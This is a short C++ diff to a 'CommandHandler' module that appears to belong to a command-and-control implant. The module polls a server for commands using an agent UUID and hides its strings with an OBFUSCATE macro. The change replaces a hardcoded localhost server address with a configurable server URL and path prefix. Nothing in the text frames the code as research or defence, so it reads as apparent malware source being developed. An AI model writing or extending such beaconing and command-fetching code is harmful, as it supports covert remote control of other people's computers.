@@ -25,7 +25,7 @@ void CommandHandler::poll() {
         switch(state) {
         case FETCH: {
             if(g_safe_mode.load() || g_deep_sleep.load()) { state = DONE; break; }
-            std::string url = server_ + OBFUSCATE("/commands/") + g_uuid;
+            std::string url = server_ + g_agent_config.path_prefix + OBFUSCATE("/commands/") + g_uuid;
             resp.clear();
             curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
             curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
@@ -64,4 +64,4 @@ void CommandHandler::init() {
     poller_.detach();
 }
 
-extern "C" Module* create_module() { return new CommandHandler(OBFUSCATE("http://localhost:5000")); }
+extern "C" Module* create_module() { return new CommandHandler(g_agent_config.server_url); }
